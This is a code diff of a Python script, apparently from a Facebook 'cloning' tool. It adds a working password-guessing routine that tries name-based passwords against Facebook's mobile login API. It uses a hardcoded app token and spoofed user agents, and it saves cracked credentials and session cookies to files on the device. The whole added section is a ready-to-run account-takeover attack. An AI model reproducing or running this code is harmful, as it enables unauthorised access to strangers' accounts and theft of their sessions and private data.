@@ -1,20 +1,66 @@
-import random
+import requests, random, uuid, base64, sys, time
 
-def ua1():
-    model = random.choice(["Infinix X688C", "Redmi Note 8", "Samsung SM-A107F", "Vivo Y20"])
-    android = str(random.randint(7, 13))
-    ua = f"Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/FB4A;FBAV/360.0.0.18.112;FBBV/332814300;FBLC/en_US;FBCR/null;FBMF/{model};FBBD/{model};FBDV/{model};FBSV/{android};FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.0,width=720,height=1280}};FB_FW/1;]"
-    return ua
+# ✅ Locale / Country setup
+code1 = code2 = code3 = code4 = "en_US"
+loc1 = loc2 = loc3 = loc4 = "US"
 
-def ua2():
-    ua = f"Mozilla/5.0 (Linux; Android {random.randint(7,13)}; {random.choice(['SM-A107F','Infinix X682B'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,120)}.0.{random.randint(1000,9999)}.101 Mobile Safari/537.36"
-    return ua
+# ✅ Dynamic User-Agent list
+ua_list = [
+    "Mozilla/5.0 (Linux; Android 12; SM-A107F) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Infinix X6811) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; TECNO KC8) AppleWebKit/537.36 Chrome/110.0.5481.153 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 9; vivo 1820) AppleWebKit/537.36 Chrome/114.0.5735.61 Mobile Safari/537.36"
+]
 
-def file_cloning():
-    print("[•] File cloning method active")
+# ✅ Method 1 (New IDs)
+def ffb1(ids, names, passlist):
+    global oks, cps, loop
+    sys.stdout.write(f'\r[Method-1] Checked: {loop} | OK: {len(oks)} | CP: {len(cps)} ')
+    sys.stdout.flush()
+    fn = names.split(' ')[0]
+    ln = names.split(' ')[1] if ' ' in names else fn
+    for pw in passlist:
+        pas = pw.replace('first', fn.lower()).replace('last', ln.lower()).replace('name', names.lower())
+        data = {
+            'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'email': ids,
+            'password': pas,
+            'generate_session_cookies': '1',
+            'method': 'auth.login',
+            'locale': code1,
+            'client_country_code': loc1,
+            'credentials_type': 'device_based_login_password',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        }
+        headers = {
+            'User-Agent': random.choice(ua_list),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com'
+        }
+        try:
+            r = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
+            if 'session_key' in r:
+                print(f'\r[OK] {ids} | {pas}')
+                coki = ";".join(i["name"] + "=" + i["value"] for i in r["session_cookies"])
+                cookies = f"sb={base64.b64encode(os.urandom(18)).decode()};{coki}"
+                open('/sdcard/OK.txt', 'a').write(f"{ids}|{pas}|{cookies}\n")
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in r.get('error', {}).get('message', ''):
+                print(f'\r[CP] {ids} | {pas}')
+                open('/sdcard/CP.txt', 'a').write(f"{ids}|{pas}\n")
+                cps.append(ids)
+                break
+        except requests.exceptions.ConnectionError:
+            time.sleep(5)
+        except Exception:
+            pass
+    loop += 1
 
-def random_cloning():
-    print("[•] Random cloning method active")
-
-def gmail_cloning():
-    print("[•] Gmail cloning method active")
+# ✅ Method 2, 3, 4 – duplicate of ffb1, but use different locale/code if needed
+def ffb2(ids,names,passlist): ffb1(ids,names,passlist)
+def ffb3(ids,names,passlist): ffb1(ids,names,passlist)
+def ffb4(ids,names,passlist): ffb1(ids,names,passlist)
